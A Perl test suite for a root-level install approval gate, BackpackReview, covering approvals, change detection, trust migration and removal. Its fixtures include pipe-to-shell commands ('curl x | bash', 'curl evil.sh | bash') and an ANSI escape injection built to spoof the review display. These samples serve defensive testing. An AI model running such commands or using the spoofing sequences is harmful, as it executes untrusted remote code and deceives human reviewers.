#!/usr/bin/env perl
# BackpackReview.pm — the interactive per-item approval walk (#21). Driven here
# through in-memory filehandles + an injectable `remove` seam so every decision
# path of this AS-ROOT install gate is exercised without a real terminal or a
# real container:
#
#   memory          already-approved items never re-prompt (only pending walked)
#   change-detect   an edited install/verify command re-prompts (not auto-trusted)
#   migration       a matching legacy whole-file trust hash seeds per-item approvals
#   dispatch        approve / remove(+confirm) / quit-defer / EOF-defer / re-prompt
#   subset          the returned approved set excludes removed + deferred items
use strict;
use warnings;
use FindBin qw($Bin);
use lib "$Bin/../../scripts";
use Test::More;
use File::Temp qw(tempdir);
use Digest::MD5 ();
use JSON::PP ();

use_ok('BackpackReview')   or BAIL_OUT('BackpackReview.pm did not load');
use_ok('BackpackApproval') or BAIL_OUT('BackpackApproval.pm did not load');

my $DIR = tempdir(CLEANUP => 1);
my $seq = 0;

# ---- helpers --------------------------------------------------------------
sub item {
    my %h = @_;
    return { category => 'apt', name => 'x', install => 'i', verify => 'v', %h };
}

sub write_bp {
    my ($path, @items) = @_;
    open my $fh, '>:raw', $path or die "write_bp $path: $!";
    print $fh JSON::PP->new->canonical(1)->encode({ version => 2, items => \@items });
    close $fh;
}

sub file_md5 {
    my $p = shift;
    open my $fh, '<:raw', $p or die "file_md5 $p: $!";
    return Digest::MD5->new->addfile($fh)->hexdigest;
}

# Run review against a fresh backpack + approvals store. Returns a hashref with
# the approved list, deferred count, captured output, unconsumed input, and the
# approvals-store path (so callers can reload it).
sub run {
    my (%o) = @_;
    my $n        = $seq++;
    my $bp_path  = "$DIR/bp-$n.json";
    my $appr_path= "$DIR/appr-$n.json";
    write_bp($bp_path, @{ $o{items} });
    if ($o{seed_approvals}) {                       # pre-approve some items
        my %appr;
        BackpackApproval::approve($_, \%appr) for @{ $o{seed_approvals} };
        BackpackApproval::save($appr_path, \%appr);
    }
    my $legacy;
    if (exists $o{legacy_trust}) {                  # write a legacy trust-hash file
        $legacy = "$DIR/trust-$n";
        open my $fh, '>:raw', $legacy or die; print $fh $o{legacy_trust}; close $fh;
    }
    my $input = defined $o{input} ? $o{input} : '';
    open my $in, '<', \$input or die "in: $!";
    my $output = '';
    open my $out, '>', \$output or die "out: $!";

    my @removes;
    my $remove = $o{remove} || sub { push @removes, { %{ $_[0] } }; 0 };

    my ($approved, $deferred) = BackpackReview::review(
        file         => $bp_path,
        approvals    => $appr_path,
        legacy_trust => $legacy,
        file_hash    => ($o{file_hash_of_file} ? file_md5($bp_path) : $o{file_hash}),
        in           => $in,
        out          => $out,
        use_color    => 0,
        remove       => $remove,
        pl           => $o{pl},
        tx           => $o{tx},
    );
    local $/; my $rest = <$in>; $rest = '' unless defined $rest;
    return {
        approved => $approved, deferred => $deferred, output => $output,
        rest => $rest, removes => \@removes, appr_path => $appr_path,
        bp_path => $bp_path, legacy => $legacy,
    };
}

sub keys_of { return [ map { BackpackApproval::item_key($_) } @{ $_[0] } ] }

# ---- 1. first time: all pending, approve all ------------------------------
{
    my @items = (item(name => 'jq'), item(name => 'git', install => 'apt-get install -y git'));
    my $r = run(items => \@items, input => "a\na\n");
    is_deeply(keys_of($r->{approved}), ['apt:jq', 'apt:git'], 'approve-all: both approved, file order');
    is($r->{deferred}, 0, 'approve-all: nothing deferred');
    like($r->{output}, qr/run AS ROOT/, 'approve-all: AS-ROOT banner shown');
    like($r->{output}, qr/install:\s+apt-get install -y git/, 'approve-all: install command shown');
    my $saved = BackpackApproval::load($r->{appr_path});
    ok(BackpackApproval::is_approved($items[0], $saved), 'approve-all: jq persisted');
    ok(BackpackApproval::is_approved($items[1], $saved), 'approve-all: git persisted');
}

# ---- 2. memory: an already-approved item is NOT re-prompted ----------------
{
    my $approved_item = item(name => 'jq');
    my @items = ($approved_item, item(name => 'curl', install => 'apt-get install -y curl'));
    # only curl is pending; feed one 'a' plus a sentinel that must remain unread
    my $r = run(items => \@items, seed_approvals => [$approved_item],
                input => "a\nSENTINEL\n");
    is_deeply(keys_of($r->{approved}), ['apt:jq', 'apt:curl'],
        'memory: pre-approved + newly-approved both returned, in order');
    is($r->{rest}, "SENTINEL\n", 'memory: only ONE prompt consumed (pre-approved item never asked)');
    like($r->{output}, qr/\[approved\] apt:jq/, 'memory: jq shown as approved in summary');
    like($r->{output}, qr/\[review\]\s+apt:curl/, 'memory: curl shown as needing review');
    like($r->{output},   qr/→ apt:curl/, 'memory: curl detail block IS walked');
    unlike($r->{output}, qr/→ apt:jq/,   'memory: jq detail block NOT walked (already approved)');
}

# ---- 3. change-detection: edited command re-prompts (NOT auto-trusted) -----
{
    my $old = item(name => 'jq', install => 'apt-get install -y jq');
    my @items = (item(name => 'jq', install => 'apt-get install -y jq=EVIL'));  # install changed
    my $r = run(items => \@items, seed_approvals => [$old], input => "q\n");
    is(scalar @{ $r->{approved} }, 0, 'change-detect: edited item is NOT auto-approved');
    like($r->{output}, qr/\[review\]\s+apt:jq/, 'change-detect: edited item back in review');
    is($r->{deferred}, 1, 'change-detect: deferred when quit');
}

# ---- 4. remove (with y confirm) calls the seam + excludes the item --------
{
    my @items = (item(name => 'jq'), item(name => 'evil', install => 'curl x | bash'));
    my $r = run(items => \@items, input => "a\nr\ny\n");
    is_deeply(keys_of($r->{approved}), ['apt:jq'], 'remove: only the approved item returned');
    is(scalar @{ $r->{removes} }, 1, 'remove: remove seam invoked once');
    is($r->{removes}[0]{name}, 'evil', 'remove: seam got the right item');
    like($r->{output}, qr/removed from backpack/, 'remove: confirmation shown');
    my $saved = BackpackApproval::load($r->{appr_path});
    ok(!exists $saved->{'apt:evil'}, 'remove: removed item not left in the approvals store');
}

# ---- 5. remove cancelled (N) re-prompts; seam NOT called -------------------
{
    my @items = (item(name => 'jq'));
    my $r = run(items => \@items, input => "r\nn\na\n");
    is_deeply(keys_of($r->{approved}), ['apt:jq'], 'remove-cancel: item approved after cancel');
    is(scalar @{ $r->{removes} }, 0, 'remove-cancel: remove seam NOT called');
}

# ---- 6. failed remove leaves the item pending (rc != 0) -------------------
{
    my @items = (item(name => 'jq'));
    my $r = run(items => \@items, input => "r\ny\n", remove => sub { 256 });  # exit 1
    is(scalar @{ $r->{approved} }, 0, 'remove-fail: nothing approved');
    like($r->{output}, qr/remove failed \(exit 1\)/, 'remove-fail: error surfaced with exit code');
    is($r->{deferred}, 1, 'remove-fail: item still counts as deferred (not decided)');
}

# ---- 7. quit defers the rest ----------------------------------------------
{
    my @items = (item(name => 'a1'), item(name => 'a2'), item(name => 'a3'));
    my $r = run(items => \@items, input => "a\nq\n");
    is_deeply(keys_of($r->{approved}), ['apt:a1'], 'quit: only pre-quit approvals kept');
    is($r->{deferred}, 2, 'quit: remaining two deferred');
}

# ---- 8. EOF defers the rest (no input) ------------------------------------
{
    my @items = (item(name => 'a1'), item(name => 'a2'));
    my $r = run(items => \@items, input => '');
    is(scalar @{ $r->{approved} }, 0, 'eof: nothing approved on empty input');
    is($r->{deferred}, 2, 'eof: all pending deferred');
}

# ---- 9. invalid input re-prompts the same item ----------------------------
{
    my @items = (item(name => 'jq'));
    my $r = run(items => \@items, input => "x\na\n");
    is_deeply(keys_of($r->{approved}), ['apt:jq'], 'reprompt: approves after junk input');
    like($r->{output}, qr/please answer a, r, or q/, 'reprompt: guidance shown on junk');
}

# ---- 10. legacy-trust migration -------------------------------------------
{
    # mismatch: a legacy trust hash that does NOT match the file must NOT seed
    # (items fall to review) and the stale trust file is retired regardless.
    my @items = (item(name => 'jq'), item(name => 'git'));
    my $r = run(items => \@items, legacy_trust => "deadbeef-not-the-hash",
                file_hash_of_file => 1, input => "q\n");
    is(scalar @{ $r->{approved} }, 0, 'migration(mismatch): nothing seeded, items fall to review');
    ok(!-e $r->{legacy}, 'migration(mismatch): legacy trust file retired (unlinked)');
}
{
    # proper match: write the file, compute its md5, put THAT in the trust file
    my $n = $seq++;
    my $bp = "$DIR/bp-mig-$n.json";
    my $appr = "$DIR/appr-mig-$n.json";
    write_bp($bp, item(name => 'jq'), item(name => 'git'));
    my $hash = file_md5($bp);
    my $trust = "$DIR/trust-mig-$n";
    open my $tf, '>:raw', $trust or die; print $tf "$hash\n"; close $tf;  # trailing NL -> must be trimmed
    my $input = "SHOULD_NOT_BE_READ\n";
    open my $in, '<', \$input or die;
    my $output = '';
    open my $out, '>', \$output or die;
    my ($approved, $deferred) = BackpackReview::review(
        file => $bp, approvals => $appr, legacy_trust => $trust, file_hash => $hash,
        in => $in, out => $out, use_color => 0, remove => sub { 0 });
    is(scalar @$approved, 2, 'migration(match): all items seeded as approved, no prompt');
    is($deferred, 0, 'migration(match): nothing deferred');
    like($output, qr/migrated a prior whole-file approval/, 'migration(match): header notes the migration');
    local $/; my $rest = <$in>; $rest = '' unless defined $rest;
    is($rest, "SHOULD_NOT_BE_READ\n", 'migration(match): no input consumed');
    ok(!-e $trust, 'migration(match): legacy trust file retired');
    # persistence: the seeded approvals survived to disk, so a second launch
    # (no trust file) still skips the prompt.
    my $saved = BackpackApproval::load($appr);
    is(scalar(keys %$saved), 2, 'migration(match): seeded approvals persisted to the store');
}

# ---- 11. prune persists: a vanished item's approval is dropped + saved -----
{
    my $jq = item(name => 'jq');
    my @items = ($jq);                                  # only jq remains in the backpack
    my $vanished = item(name => 'gone');
    my $r = run(items => \@items, seed_approvals => [$jq, $vanished], input => '');
    # jq already approved, gone is not present -> no pending -> returns jq.
    is_deeply(keys_of($r->{approved}), ['apt:jq'], 'prune: returns only the surviving approved item');
    my $saved = BackpackApproval::load($r->{appr_path});
    ok(exists $saved->{'apt:jq'},   'prune: surviving approval kept on disk');
    ok(!exists $saved->{'apt:gone'},'prune: vanished approval dropped from disk');
}

# ---- 12. a stray per-item version is stripped from the returned item -------
{
    my @items = (item(name => 'jq', version => '1.6'));
    my $r = run(items => \@items, input => "a\n");
    ok(!exists $r->{approved}[0]{version}, 'version: stray per-item version stripped from the install-set item');
}

# ---- 13. unparseable backpack -> ([],0), no crash -------------------------
{
    my $n = $seq++;
    my $bp = "$DIR/bad-$n.json";
    open my $fh, '>:raw', $bp or die; print $fh "{ not valid"; close $fh;
    my $input = '';
    open my $in, '<', \$input or die;
    my $output = '';
    open my $out, '>', \$output or die;
    my ($approved, $deferred) = BackpackReview::review(
        file => $bp, approvals => "$DIR/appr-bad-$n.json",
        in => $in, out => $out, use_color => 0, remove => sub { 0 });
    is_deeply($approved, [], 'bad-json: empty approved set');
    is($deferred, 0, 'bad-json: zero deferred');
    like($output, qr/could not parse backpack/, 'bad-json: warns and skips');
}

# ---- 14. integration: the DEFAULT remove seam really mutates the file -----
SKIP: {
    my $pl = "$Bin/../../../backpack/scripts/backpack.pl";
    skip "real backpack.pl not found at $pl", 2 unless -f $pl;
    my $n = $seq++;
    my $bp = "$DIR/bp-int-$n.json";
    write_bp($bp, item(name => 'jq'), item(name => 'doomed', install => 'apt-get install -y doomed'));
    my $input = "a\nr\ny\n";
    open my $in, '<', \$input or die;
    my $output = '';
    open my $out, '>', \$output or die;
    # NO injected remove -> exercises the default `$^X $pl remove ...` path.
    my ($approved, $deferred) = BackpackReview::review(
        file => $bp, approvals => "$DIR/appr-int-$n.json", pl => $pl,
        in => $in, out => $out, use_color => 0);
    is_deeply(keys_of($approved), ['apt:jq'], 'integration: only jq approved');
    my $after = JSON::PP->new->decode(do { open my $f, '<:raw', $bp or die; local $/; <$f> });
    my @names = map { $_->{name} } @{ $after->{items} };
    is_deeply([sort @names], ['jq'], 'integration: default remove seam deleted "doomed" from backpack.json');
}

# ---- 15. terminal-control injection neutralized (red-team HIGH) -----------
# A hostile field must not be able to emit ESC/cursor sequences that spoof the
# review display (forge a benign install line while approving a malicious one).
{
    my $evil_rationale = "looks fine\e[2A\e[2K    install:   apt-get install -y jq\e[0m";
    my @items = (item(name => 'jq', install => "curl evil.sh | bash",
                      verify => "true\e[1A", rationale => $evil_rationale));
    my @tx;
    my $r = run(items => \@items, input => "q\n", tx => sub { push @tx, $_[0] });
    unlike($r->{output}, qr/\e/, 'ansi-injection: no ESC byte reaches the terminal (use_color off)');
    unlike(join('', @tx), qr/\e/, 'ansi-injection: no ESC byte reaches the transcript');
    like($r->{output}, qr/\Qcurl evil.sh | bash\E/, 'ansi-injection: the REAL install command shown verbatim');
}

done_testing();
